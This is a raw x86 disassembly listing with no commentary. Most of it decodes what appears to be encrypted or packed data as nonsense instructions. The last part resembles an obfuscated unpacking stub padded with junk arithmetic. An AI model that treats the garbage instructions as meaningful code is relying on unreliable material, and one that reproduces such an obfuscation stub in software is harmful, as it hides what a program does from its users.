  4031aa:	les    ebp,FWORD PTR [edx+0x1adcd032]
  4031b0:	rcr    BYTE PTR [ebp-0x7597c2c7],cl
  4031b6:	call   0x8a659b09
  4031bb:	jnp    0x40322c
  4031bd:	in     eax,0x58
  4031bf:	fs xor eax,0xaf15c377
  4031c5:	aam    0x44
  4031c7:	mov    edi,0x558edb17
  4031cc:	lock pop es
  4031ce:	pop    es
  4031cf:	mov    eax,ds:0xfeb6d25e
  4031d4:	ror    DWORD PTR [ebx+0x36],cl
  4031d7:	sbb    eax,0xaf3ebe3e
  4031dc:	jnp    0x403230
  4031de:	sti    
  4031df:	outs   dx,DWORD PTR ds:[esi]
  4031e0:	ss mov fs,WORD PTR cs:[edi+0x23a6c98f]
  4031e8:	fidiv  DWORD PTR [edi]
  4031ea:	ret    0xda0
  4031ed:	inc    edi
  4031ee:	call   0x93804d69
  4031f3:	pop    ss
  4031f4:	(bad)  
  4031f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031f6:	sub    DWORD PTR [esi+0x31],edx
  4031f9:	adc    eax,DWORD PTR [eax-0x6e]
  4031fc:	pop    edx
  4031fd:	add    al,0x73
  4031ff:	mov    ebx,0x5a7d2645
  403204:	cmp    BYTE PTR [ebx],bl
  403206:	jb     0x40319c
  403208:	jno    0x403247
  40320a:	(bad)  
  40320c:	mov    cl,0x5
  40320e:	sti    
  40320f:	popa   
  403210:	jns    0x4031a0
  403212:	cs ins BYTE PTR es:[edi],dx
  403214:	fmul   QWORD PTR [ecx+0x6eef1f8e]
  40321a:	mov    dh,0x28
  40321c:	add    ebx,DWORD PTR [eax+edx*4]
  40321f:	xor    BYTE PTR [ebx+0x480831d5],bh
  403225:	fcomi  st,st(4)
  403227:	fnsave [esi-0x3b5556f7]
  40322d:	cwde   
  40322e:	outs   dx,BYTE PTR ds:[esi]
  40322f:	jg     0x4031e4
  403231:	cdq    
  403232:	xor    BYTE PTR [esi+0x635535c3],dh
  403238:	sbb    edx,DWORD PTR [eax-0x7b]
  40323b:	mov    al,0x59
  40323d:	bndstx [ecx+0x4a],bnd3
  403241:	jecxz  0x40329b
  403243:	(bad)
  403246:	lea    ebp,[eax-0x92bbb6d]
  40324c:	xor    eax,0x85b11d80
  403251:	xor    ch,BYTE PTR [esi-0x404fcd3c]
  403257:	jecxz  0x403202
  403259:	shr    DWORD PTR [ebx+0xb],1
  40325c:	jmp    DWORD PTR [edx+0x3029b9ac]
  403262:	pushf  
  403263:	pop    esi
  403264:	jg     0x403238
  403266:	repz sbb bh,BYTE PTR [ecx+0x56f970a2]
  40326d:	arpl   WORD PTR [ebx-0x4f99226d],si
  403273:	stos   DWORD PTR es:[edi],eax
  403274:	xor    BYTE PTR [edi+0x21bb92e0],0x47
  40327b:	mov    ebx,0x1e6f549f
  403280:	mov    bh,0x98
  403282:	cld    
  403283:	sar    DWORD PTR [eax-0x198f1b80],1
  403289:	mov    ds,WORD PTR [ecx+0x50f2cdf8]
  40328f:	mov    eax,0x3fd758d
  403294:	or     BYTE PTR fs:[ecx-0x7a],ch
  403298:	push   edi
  403299:	push   edi
  40329a:	inc    edx
  40329b:	repnz cmp dh,cl
  40329e:	stc    
  40329f:	push   ds
  4032a0:	call   0x2af5:0xce8c96f0
  4032a7:	gs pop esi
  4032a9:	or     dh,dh
  4032ab:	pop    esp
  4032ac:	nop
  4032ad:	sti    
  4032ae:	ds sub dl,bl
  4032b1:	sahf   
  4032b2:	pop    edx
  4032b3:	mov    dl,0x85
  4032b5:	or     al,0xc9
  4032b7:	sub    ecx,ebx
  4032b9:	(bad)  [ebp+ebp*2-0x5234a4d6]
  4032c0:	pop    edi
  4032c1:	out    0x3a,al
  4032c3:	mov    dh,BYTE PTR [eax]
  4032c5:	or     eax,0xac18da1d
  4032ca:	jmp    0x3cb016b8
  4032cf:	ja     0x403251
  4032d1:	outs   dx,DWORD PTR ds:[esi]
  4032d2:	cli    
  4032d3:	adc    al,0xbc
  4032d5:	and    edx,ebx
  4032d7:	mov    dh,0x74
  4032d9:	pusha  
  4032da:	dec    eax
  4032db:	mov    dh,dl
  4032dd:	push   eax
  4032de:	(bad)  
  4032df:	icebp  
  4032e0:	cmp    eax,eax
  4032e2:	repnz mov BYTE PTR [esi+ebp*8],ah
  4032e6:	xchg   ebx,eax
  4032e7:	xchg   ecx,eax
  4032e8:	scas   al,BYTE PTR es:[edi]
  4032e9:	pop    ss
  4032ea:	stc    
  4032eb:	dec    eax
  4032ec:	lods   al,BYTE PTR ds:[esi]
  4032ed:	cwde   
  4032ee:	lahf   
  4032ef:	stos   BYTE PTR es:[edi],al
  4032f0:	cmovl  ebp,DWORD PTR [edi-0x68]
  4032f4:	in     eax,0xe6
  4032f6:	jge    0x403309
  4032f8:	sbb    eax,0x224ab3fb
  4032fd:	jnp    0x40336b
  4032ff:	xor    BYTE PTR [ebp+0x1756281c],0x8e
  403306:	ins    BYTE PTR es:[edi],dx
  403307:	jp     0x403303
  403309:	mov    edx,0x6818e74b
  40330e:	fldcw  WORD PTR [eax-0x4ddcf637]
  403314:	or     edx,edi
  403316:	mov    ebp,0x9e4bbc37
  40331b:	adc    BYTE PTR [esi-0x42],al
  40331e:	pop    es
  40331f:	pop    edx
  403320:	and    edi,ecx
  403322:	mov    BYTE PTR [edi],bh
  403324:	(bad)  
  403325:	pop    ds
  403326:	mov    bh,0x9c
  403328:	or     al,0xc2
  40332a:	test   DWORD PTR es:[esi+edi*1],esp
  40332e:	jno    0x403368
  403330:	and    DWORD PTR [edi+ebx*4+0x3125fd42],edx
  403337:	jecxz  0x403357
  403339:	xor    DWORD PTR [eax],edx
  40333b:	call   0xbf37c467
  403340:	ret    
  403341:	xor    bh,BYTE PTR [ecx-0x66]
  403344:	or     BYTE PTR [esi],bl
  403346:	mov    WORD PTR [ecx+0x2d88d19e],?
  40334c:	retf   
  40334d:	imul   ecx,DWORD PTR [esi+0x12],0xc266fe16
  403354:	call   0x8fa6db51
  403359:	xor    eax,0x76b0a6ce
  40335e:	dec    ecx
  40335f:	lds    ebx,FWORD PTR [eax]
  403361:	push   ds
  403362:	sbb    al,0x58
  403364:	jecxz  0x4033cc
  403366:	ins    DWORD PTR es:[edi],dx
  403367:	jecxz  0x403393
  403369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40336a:	push   es
  40336b:	add    al,0x42
  40336d:	fsubr  DWORD PTR [esi-0x2fbc0cd]
  403373:	call   0xf947:0xf998210c
  40337a:	add    eax,0x6e54718d
  40337f:	sub    DWORD PTR ds:0x7e1db385,esi
  403385:	inc    esi
  403386:	mul    BYTE PTR fs:[ecx]
  403389:	sbb    al,0x3e
  40338b:	cmc    
  40338c:	push   es
  40338d:	adc    ch,BYTE PTR [ebp+0x268cb9d]
  403393:	or     BYTE PTR [ebx],al
  403395:	cmp    BYTE PTR [ebx],dh
  403397:	es cli 
  403399:	sub    DWORD PTR [eax],esp
  40339b:	sahf   
  40339c:	pusha  
  40339d:	test   DWORD PTR ds:0x41112098,0xb0bea7a5
  4033a7:	xor    cl,BYTE PTR [eax+0x73]
  4033aa:	ins    DWORD PTR es:[edi],dx
  4033ab:	mov    ebp,0xf41fd65d
  4033b0:	mov    ebx,DWORD PTR [edx-0x76]
  4033b3:	xchg   edx,eax
  4033b4:	popf   
  4033b5:	push   edi
  4033b6:	mov    ebp,0xb96eec01
  4033bb:	pop    DWORD PTR [esi+0x2a]
  4033be:	jle    0x40338f
  4033c0:	retf   
  4033c1:	test   eax,0x4f95a51d
  4033c6:	shr    DWORD PTR [eax+0x5b],cl
  4033c9:	jno    0x403380
  4033cb:	pop    ebp
  4033cc:	out    0x8a,al
  4033ce:	jnp    0x403369
  4033d0:	xchg   ecx,eax
  4033d1:	outs   dx,DWORD PTR ds:[esi]
  4033d2:	aaa    
  4033d3:	mov    ecx,0x146a9051
  4033d8:	in     eax,dx
  4033d9:	pop    ebx
  4033da:	ins    DWORD PTR es:[edi],dx
  4033db:	or     al,0x34
  4033dd:	test   al,0xd6
  4033df:	cmp    ebp,DWORD PTR [ebp-0x68307282]
  4033e5:	imul   eax,DWORD PTR [edi+0x52],0xc7a80916
  4033ec:	and    DWORD PTR [edi],edx
  4033ee:	cmp    bl,BYTE PTR [ebx+0x62754e3]
  4033f4:	sub    al,0x64
  4033f6:	out    dx,eax
  4033f7:	fisubr WORD PTR [ecx]
  4033f9:	push   ss
  4033fa:	ins    DWORD PTR es:[edi],dx
  4033fb:	cmp    BYTE PTR [edi+0x484b6adb],dh
  403401:	lock fistp QWORD PTR [ebp+0x1]
  403405:	in     eax,0xf6
  403407:	neg    BYTE PTR [edx+0x23]
  40340a:	loop   0x4033eb
  40340c:	cmp    al,0x63
  40340e:	and    al,0x9
  403410:	repz popa 
  403412:	sti    
  403413:	je     0x40346e
  403415:	popa   
  403416:	push   es
  403417:	clc    
  403418:	cmp    dh,bh
  40341a:	and    al,BYTE PTR [ebp-0x186d71d8]
  403420:	call   0x3ba9:0xced63c34
  403427:	dec    edx
  403428:	imul   ebp,DWORD PTR [edx],0x9dc04ef8
  40342e:	xor    eax,0xab73777
  403433:	add    eax,edi
  403435:	inc    esi
  403436:	jmp    0xcd243bb1
  40343b:	ins    DWORD PTR es:[edi],dx
  40343c:	sub    bl,al
  40343e:	jbe    0x4033fb
  403440:	or     esi,esi
  403442:	pop    DWORD PTR [esi-0x1b1d9ead]
  403448:	aaa    
  403449:	pop    ecx
  40344a:	fsub   st(4),st
  40344c:	out    dx,al
  40344d:	fidivr DWORD PTR [eax]
  40344f:	jle    0x40345a
  403451:	pop    ecx
  403452:	lods   al,BYTE PTR ds:[esi]
  403453:	dec    edx
  403454:	push   ebp
  403455:	and    cl,BYTE PTR [edx+edi*4-0x2702b0f6]
  40345c:	jmp    0x2c82:0x4c6aa617
  403463:	and    bl,0xcc
  403466:	and    eax,0xfe4743d8
  40346b:	add    DWORD PTR [edx+0x54],0x22576ddb
  403472:	dec    ebp
  403473:	and    al,0xcf
  403475:	sub    DWORD PTR [eax-0x59136740],ebp
  40347b:	sbb    bl,dh
  40347d:	mov    cl,0xd2
  40347f:	mov    DWORD PTR [edi],esi
  403481:	pop    ebp
  403482:	out    0x22,al
  403484:	push   0xf00d2eae
  403489:	data16 jno 0x40342f
  40348c:	loope  0x4034ac
  40348e:	cmp    BYTE PTR [ebx],0x70
  403491:	inc    esp
  403492:	repnz mov dh,cl
  403495:	mov    dl,0xcd
  403497:	out    0x81,al
  403499:	mov    bh,0xee
  40349b:	jmp    0x403437
  40349d:	test   BYTE PTR [esi+0xe],cl
  4034a0:	sbb    BYTE PTR [ecx],ch
  4034a2:	sbb    DWORD PTR [esp+ebp*4+0x8],ebp
  4034a6:	dec    edi
  4034a7:	xor    dl,al
  4034a9:	and    DWORD PTR [ecx],edi
  4034ab:	push   edi
  4034ac:	aam    0xcc
  4034ae:	aam    0xfd
  4034b0:	icebp  
  4034b1:	mov    dl,0x72
  4034b3:	cli    
  4034b4:	pop    ds
  4034b5:	inc    edx
  4034b6:	jp     0x403537
  4034b8:	mov    ah,0xaf
  4034ba:	jbe    0x40350b
  4034bc:	add    edx,ebp
  4034be:	push   0x556d0f93
  4034c3:	gs inc ecx
  4034c5:	push   ebp
  4034c6:	push   0xffffff94
  4034c8:	pop    eax
  4034c9:	and    esi,esp
  4034cb:	adc    al,0x26
  4034cd:	inc    esi
  4034ce:	xor    dl,BYTE PTR [ebp+0x46]
  4034d1:	test   eax,0xca207d07
  4034d6:	fstp   TBYTE PTR [edi+0x27cf892e]
  4034dc:	(bad)  
  4034de:	(bad)  
  4034e0:	inc    eax
  4034e1:	stos   DWORD PTR es:[edi],eax
  4034e2:	inc    ebp
  4034e3:	xor    dh,ch
  4034e5:	leave  
  4034e6:	inc    ecx
  4034e7:	fist   DWORD PTR [esi-0x62eb3d05]
  4034ed:	stc    
  4034ee:	repnz mov ds:0x8818423f,al
  4034f4:	loopne 0x40351f
  4034f6:	mov    al,0x67
  4034f8:	inc    esi
  4034f9:	fstp   TBYTE PTR [ebx-0xb87b25]
  4034ff:	out    dx,al
  403500:	call   0x2106:0x6b96b478
  403507:	mov    ds:0x6597c159,al
  40350c:	fistp  QWORD PTR [eax-0x3b]
  40350f:	into   
  403510:	adc    DWORD PTR [edi],esi
  403512:	mov    eax,0x5ab00d0c
  403517:	ret    0xb6bf
  40351a:	add    DWORD PTR [ebp+0x13c4b254],edi
  403520:	sbb    BYTE PTR [edx+0xac0caa8],0x3c
  403527:	mov    BYTE PTR [edx],al
  403529:	out    dx,eax
  40352a:	int3   
  40352b:	dec    eax
  40352c:	jo     0x4035a3
  40352e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40352f:	pushf  
  403530:	jbe    0x40354e
  403532:	xlat   BYTE PTR ds:[ebx]
  403533:	fcomp  DWORD PTR [esi]
  403535:	ret    0x23ed
  403538:	imul   ecx,DWORD PTR [eax+0x2b12bfb0],0x35
  40353f:	in     al,dx
  403540:	dec    ecx
  403541:	lods   eax,DWORD PTR ds:[esi]
  403542:	inc    esp
  403543:	xor    eax,0x24d1fa30
  403548:	cdq    
  403549:	xchg   edx,eax
  40354a:	jle    0x40359a
  40354c:	mov    esi,0x402da500
  403551:	push   esp
  403552:	sbb    cl,bh
  403554:	sbb    DWORD PTR [esi-0x22a758a6],ebx
  40355a:	adc    eax,0x12e777a4
  40355f:	test   al,0xdf
  403561:	imul   esi,DWORD PTR [edx-0x6fcbd0c4],0x7672b7d1
  40356b:	mov    cl,BYTE PTR [esi+eiz*2-0xfafebd9]
  403572:	std    
  403573:	cdq    
  403574:	cdq    
  403575:	adc    ah,BYTE PTR [eax-0x14]
  403578:	mov    WORD PTR [eax],fs
  40357a:	mov    ecx,0xb910d07
  40357f:	call   DWORD PTR [esi-0x6c]
  403582:	inc    ebp
  403583:	out    dx,eax
  403584:	pop    esp
  403585:	and    dl,cl
  403587:	mov    ds:0x65e9b74,eax
  40358c:	jnp    0x40359f
  40358e:	xchg   edi,eax
  40358f:	sbb    bl,BYTE PTR [edi+0x1692a2b6]
  403595:	mov    cl,0x1e
  403597:	inc    eax
  403598:	push   ecx
  403599:	xchg   edx,eax
  40359a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40359b:	and    al,0x6b
  40359d:	out    0xcf,al
  40359f:	(bad)  
  4035a0:	retf   0xfa09
  4035a3:	jmp    0x2b9130d8
  4035a8:	xor    edi,DWORD PTR [ecx]
  4035aa:	imul   esp,DWORD PTR [ebp+0x7f229b0c],0x8170f8cd
  4035b4:	push   ebx
  4035b5:	mov    dh,0x48
  4035b7:	pop    esi
  4035b8:	cmc    
  4035b9:	xor    al,0x31
  4035bb:	mov    ah,0x67
  4035bd:	rcl    BYTE PTR [eax-0x537e263a],1
  4035c3:	xchg   esp,eax
  4035c4:	ficomp WORD PTR [esi+0x4df1e031]
  4035ca:	es ins BYTE PTR es:[edi],dx
  4035cc:	push   eax
  4035cd:	cmc    
  4035ce:	mov    dh,0xd6
  4035d0:	inc    edx
  4035d1:	sar    BYTE PTR [esi],0xf9
  4035d4:	inc    eax
  4035d5:	repz leave 
  4035d7:	outs   dx,DWORD PTR ds:[esi]
  4035d8:	mov    eax,0xd827fee3
  4035dd:	mov    dh,0xf6
  4035df:	xchg   BYTE PTR ds:0xf09638cf,al
  4035e5:	iret   
  4035e6:	dec    edi
  4035e7:	mov    BYTE PTR [eax+0x7f],bl
  4035ea:	in     eax,dx
  4035eb:	mov    DWORD PTR [esi],ecx
  4035ed:	lds    esi,FWORD PTR [edx-0x77]
  4035f0:	retf   0x2a81
  4035f3:	add    ebx,edi
  4035f5:	xor    ebp,ecx
  4035f7:	lahf   
  4035f8:	lds    esi,FWORD PTR [eax+0x549892cd]
  4035fe:	daa    
  4035ff:	and    esp,DWORD PTR [ecx*4+0x5ea58dd8]
  403606:	xchg   esp,eax
  403607:	inc    ebx
  403608:	xor    eax,0x55c215ef
  40360d:	jo     0x403683
  40360f:	loope  0x40360b
  403611:	dec    edi
  403612:	loop   0x4035e2
  403614:	jmp    0x4035e3
  403616:	sub    DWORD PTR [ecx],ecx
  403618:	inc    ecx
  403619:	inc    esp
  40361a:	push   ebx
  40361b:	(bad)  
  40361c:	adc    bl,dh
  40361e:	xor    ch,BYTE PTR [edx-0x1494ba72]
  403624:	(bad)  
  403625:	nop
  403626:	or     BYTE PTR [esi+0x29531e4b],0x3
  40362d:	rcl    DWORD PTR [edx+eiz*2],cl
  403630:	inc    esp
  403631:	ret    
  403632:	pop    esp
  403633:	in     eax,0x6f
  403635:	aam    0x8d
  403637:	repnz dec esi
  403639:	inc    edx
  40363a:	sbb    DWORD PTR [eax-0x2a],edx
  40363d:	or     al,0x65
  40363f:	or     edx,ebx
  403641:	mov    edi,0x4c353b8
  403646:	and    ebp,DWORD PTR [ebx]
  403648:	sbb    al,0xc1
  40364a:	pop    ds
  40364b:	inc    ebp
  40364c:	aaa    
  40364d:	leave  
  40364e:	xor    BYTE PTR [ecx-0x15f2f8a4],0xc4
  403655:	out    dx,eax
  403656:	scas   eax,DWORD PTR es:[edi]
  403657:	(bad)  
  403658:	and    eax,0x3e965050
  40365d:	addr16 mov bl,0x11
  403660:	test   eax,0x36954e9d
  403665:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403666:	lods   al,BYTE PTR ds:[esi]
  403667:	aas    
  403668:	cmp    BYTE PTR [ebp-0x187c3000],cl
  40366e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40366f:	or     eax,0x50d9aa8c
  403674:	push   es
  403675:	add    ch,BYTE PTR [ecx+0x2a]
  403678:	cmp    dh,BYTE PTR [edx]
  40367a:	jl     0x403656
  40367c:	lahf   
  40367d:	iret   
  40367e:	pop    ebp
  40367f:	into   
  403680:	in     eax,0x47
  403682:	pop    edi
  403683:	popa   
  403684:	push   ecx
  403685:	leave  
  403686:	cwde   
  403687:	test   BYTE PTR [ecx+0x4f87c250],al
  40368d:	dec    eax
  40368e:	(bad)  
  40368f:	int    0xa3
  403691:	dec    ebp
  403692:	push   es
  403693:	popa   
  403694:	jg     0x4036de
  403696:	inc    eax
  403697:	xlat   BYTE PTR ds:[ebx]
  403698:	jno    0x4036d0
  40369a:	repz iret 
  40369c:	or     eax,0x3806c07a
  4036a1:	fist   DWORD PTR [edx]
  4036a4:	mov    ds:0x37b57c6e,eax
  4036a9:	pop    ebx
  4036ab:	pop    esp
  4036ac:	cs add edi,esp
  4036af:	xchg   esp,eax
  4036b0:	cli    
  4036b1:	and    bh,0x4a
  4036b4:	add    eax,0xa2cc8ce4
  4036b9:	add    BYTE PTR [ebp-0x3ef29ce4],dh
  4036bf:	dec    esi
  4036c0:	or     esi,ebx
  4036c2:	mov    edx,0xefe0d372
  4036c7:	into   
  4036c8:	popa   
  4036c9:	xchg   ebx,eax
  4036ca:	or     al,0xe8
  4036cc:	enter  0xe4c7,0xa5
  4036d0:	pop    edi
  4036d1:	xchg   ecx,eax
  4036d2:	je     0x40365d
  4036d4:	fbld   TBYTE PTR [ebx+0x3c]
  4036d7:	sar    BYTE PTR [ebp+0x2ed298b6],0xfe
  4036de:	inc    esp
  4036df:	xor    esp,DWORD PTR [esi+0x2d]
  4036e2:	jge    0x4036ac
  4036e4:	loop   0x40368a
  4036e6:	pop    esi
  4036e7:	daa    
  4036e8:	push   ss
  4036e9:	jae    0x403769
  4036eb:	icebp  
  4036ec:	mov    eax,0xb0d47a
  4036f1:	xlat   BYTE PTR ds:[ebx]
  4036f2:	jb     0x403753
  4036f4:	xchg   esi,eax
  4036f5:	loope  0x4036a8
  4036f7:	mov    ?,esp
  4036f9:	adc    BYTE PTR [edx],0xcf
  4036fc:	fmul   DWORD PTR [edx+0x77e68d42]
  403702:	push   0x281e2a6e
  403707:	sbb    BYTE PTR [eax+edx*4-0x14],al
  40370b:	jno    0x40373a
  40370d:	dec    edx
  40370e:	lods   eax,DWORD PTR ds:[esi]
  40370f:	push   ecx
  403710:	vmulpd ymm3,ymm2,YMMWORD PTR [ebp+0x74570125]
  403718:	jo     0x403730
  40371a:	adc    DWORD PTR [eax-0x4b],edx
  40371d:	cmp    esi,DWORD PTR [edi-0x15]
  403720:	push   DWORD PTR [edi+0x15]
  403723:	cmc    
  403724:	fs push es
  403726:	add    esi,esp
  403728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403729:	xchg   edx,eax
  40372a:	jb     0x403717
  40372c:	(bad)  
  40372d:	sbb    al,BYTE PTR [ebx-0x29]
  403730:	pop    ebx
  403731:	sub    BYTE PTR [edx-0x43],ch
  403734:	out    dx,al
  403735:	jg     0x403767
  403737:	les    ecx,FWORD PTR [ebx]
  403739:	dec    ebp
  40373a:	xchg   ch,dh
  40373c:	inc    ecx
  40373d:	sub    ecx,esp
  40373f:	ins    BYTE PTR es:[edi],dx
  403740:	xor    bl,cl
  403742:	sahf   
  403743:	pop    edx
  403744:	pop    esp
  403745:	jae    0x403738
  403747:	sti    
  403748:	(bad)
  40374b:	test   al,0x43
  40374d:	xchg   ecx,eax
  40374e:	es aad 0x77
  403751:	or     eax,0xd7eaa1b
  403756:	lods   eax,DWORD PTR ds:[esi]
  403757:	mov    edx,DWORD PTR [eax+0x4f]
  40375a:	jno    0x403702
  40375c:	lea    edx,[edi]
  40375e:	mov    eax,ds:0x1c4fd102
  403763:	sar    BYTE PTR [ebp-0x51],0x68
  403767:	mov    eax,0xe6aedfea
  40376c:	mov    es,WORD PTR [eax+0x13]
  40376f:	sbb    al,0x63
  403771:	inc    ebx
  403772:	fld    DWORD PTR ds:0xeab4cc88
  403778:	inc    edi
  403779:	adc    al,0x88
  40377b:	rcl    DWORD PTR [esi+0x7bf0c23f],1
  403781:	shr    BYTE PTR [edx-0x60],cl
  403784:	test   BYTE PTR [esi+0x2cdb377e],dh
  40378a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40378b:	(bad)  
  40378c:	cmc    
  40378d:	pop    edi
  40378e:	xor    DWORD PTR [ebx+0x7f45605b],edx
  403794:	jecxz  0x4037b7
  403796:	cdq    
  403797:	dec    esp
  403798:	ror    DWORD PTR [ebx],cl
  40379a:	fsub   st(1),st
  40379c:	je     0x403787
  40379e:	fisttp DWORD PTR [ecx+esi*2-0x11c4eb4]
  4037a5:	inc    ebx
  4037a6:	lods   al,BYTE PTR ds:[esi]
  4037a7:	or     DWORD PTR [edx+0x67],edi
  4037aa:	xchg   ecx,eax
  4037ab:	fadd   DWORD PTR ss:[esi]
  4037af:	psubsw mm5,QWORD PTR [eax+0x7e]
  4037b3:	int3   
  4037b4:	imul   eax,ebx,0x133cfdb3
  4037ba:	pop    eax
  4037bb:	adc    esp,DWORD PTR [eax]
  4037bd:	in     al,dx
  4037be:	sbb    cl,BYTE PTR [ebx]
  4037c0:	cld    
  4037c1:	out    dx,al
  4037c2:	daa    
  4037c3:	cmc    
  4037c4:	sbb    ebp,DWORD PTR [ecx+0x3e]
  4037c7:	sub    ah,al
  4037c9:	push   edi
  4037ca:	sbb    edx,ebx
  4037cc:	lods   eax,DWORD PTR ds:[esi]
  4037cd:	mov    esi,0x979808f3
  4037d2:	aaa    
  4037d3:	dec    edi
  4037d4:	or     al,0x39
  4037d6:	pop    eax
  4037d7:	pop    ds
  4037d8:	clc    
  4037d9:	or     eax,0xb2debdc5
  4037de:	pop    ecx
  4037df:	clc    
  4037e0:	mov    ds:0xc275fe44,eax
  4037e5:	push   eax
  4037e6:	stc    
  4037e7:	fsub   st,st(6)
  4037e9:	sub    BYTE PTR [ebx-0x1a639d5e],0x22
  4037f0:	pop    esp
  4037f1:	sub    eax,0x293234dc
  4037f6:	imul   eax,DWORD PTR [eax],0xf
  4037f9:	jmp    0x403850
  4037fb:	lds    ecx,FWORD PTR [edx]
  4037fd:	aas    
  4037fe:	dec    esi
  4037ff:	int    0x36
  403801:	aas    
  403802:	mov    cl,0x90
  403804:	mov    ebx,0xff1accd4
  403809:	lods   al,BYTE PTR ds:[esi]
  40380a:	es js  0x4037c9
  40380d:	xchg   BYTE PTR [edi],cl
  40380f:	push   ss
  403810:	movzx  esp,sp
  403813:	dec    edx
  403814:	pop    ecx
  403815:	mov    eax,ds:0xf34dfad1
  40381a:	jns    0x403896
  40381c:	pop    bx
  40381e:	add    eax,0xdb3dd02
  403823:	mov    bl,0xf8
  403825:	adc    BYTE PTR [ebx],0x79
  403828:	push   ecx
  403829:	(bad)  
  40382a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40382b:	add    bl,BYTE PTR [eax-0x63]
  40382e:	pop    es
  40382f:	push   edi
  403830:	daa    
  403831:	mov    ds:0xac7c0833,al
  403836:	cmp    BYTE PTR [esi],0x3f
  403839:	inc    ecx
  40383a:	xor    edx,DWORD PTR [ecx]
  40383c:	sub    al,bl
  40383e:	jecxz  0x403843
  403840:	pop    ss
  403841:	loop   0x40386e
  403843:	mov    al,ds:0xaf06e16c
  403848:	lea    ebp,[edi]
  40384a:	mul    DWORD PTR [edx+0x4e8d0ff4]
  403850:	lahf   
  403851:	jno    0x4037d8
  403853:	push   esp
  403854:	fdivp  st(4),st
  403856:	loope  0x403880
  403858:	test   DWORD PTR [edi],edx
  40385a:	inc    eax
  40385b:	sub    eax,0xf221b31f
  403860:	cmp    ecx,DWORD PTR [ecx+0x53e7e45]
  403866:	in     eax,0x2e
  403868:	pusha  
  403869:	retf   
  40386a:	lahf   
  40386b:	pop    ds
  40386c:	or     ebx,edx
  40386e:	inc    edi
  40386f:	sbb    al,0x59
  403871:	jge    0x1298b78c
  403877:	addr16 shl bh,1
  40387a:	hlt    
  40387b:	sti    
  40387c:	jo     0x403873
  40387e:	xchg   ebp,eax
  40387f:	dec    ebx
  403880:	jne    0x4038c1
  403882:	hlt    
  403883:	xor    eax,0x6328f304
  403888:	mov    esi,0x9ceee00d
  40388d:	test   DWORD PTR [ebp+0x8e72c5a],edx
  403893:	iret   
  403894:	std    
  403895:	repz mov ecx,0xee866a21
  40389b:	jl     0x40387a
  40389d:	imul   edx,DWORD PTR ds:0x54db2944,0x75fd8746
  4038a7:	jno    0x4038ba
  4038a9:	mov    dl,BYTE PTR [ecx+0x47e81c8d]
  4038af:	(bad)  
  4038b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038b1:	cld    
  4038b2:	mov    esp,0x2dd3a69d
  4038b7:	mov    esi,0xe44066ae
  4038bc:	dec    ebx
  4038bd:	xor    al,0xb1
  4038bf:	addr16 cmp al,0xad
  4038c2:	mov    ebx,0xdfde3095
  4038c7:	ficom  WORD PTR [ecx]
  4038c9:	pop    edi
  4038ca:	add    BYTE PTR [esi-0x54],al
  4038cd:	sbb    DWORD PTR [ecx],ecx
  4038cf:	in     al,dx
  4038d0:	push   0x2c308a60
  4038d5:	test   BYTE PTR [edi+edx*8-0x5b4b30a9],dl
  4038dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038dd:	mov    cl,0x95
  4038df:	int3   
  4038e0:	dec    edi
  4038e1:	dec    ecx
  4038e2:	sbb    al,0x8b
  4038e4:	jl     0x403879
  4038e6:	ins    BYTE PTR es:[edi],dx
  4038e7:	mov    edi,0xcfd3a64f
  4038ec:	icebp  
  4038ed:	pop    esp
  4038ee:	or     esp,DWORD PTR [edi]
  4038f0:	(bad)  
  4038f1:	das    
  4038f2:	adc    bl,dl
  4038f4:	push   ecx
  4038f5:	cli    
  4038f6:	bound  eax,QWORD PTR [eax]
  4038f8:	pop    edx
  4038f9:	mov    ah,0xa1
  4038fb:	mov    ah,0xb8
  4038fd:	adc    eax,0x8ef9bd93
  403902:	nop
  403903:	mov    ecx,DWORD PTR [ebp-0x10]
  403906:	sub    DWORD PTR ds:0x426eb9,0x426ea1
  403910:	xor    eax,esi
  403912:	adc    DWORD PTR ds:0x426f2d,0x426f05
  40391c:	xor    ecx,esi
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x430a44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
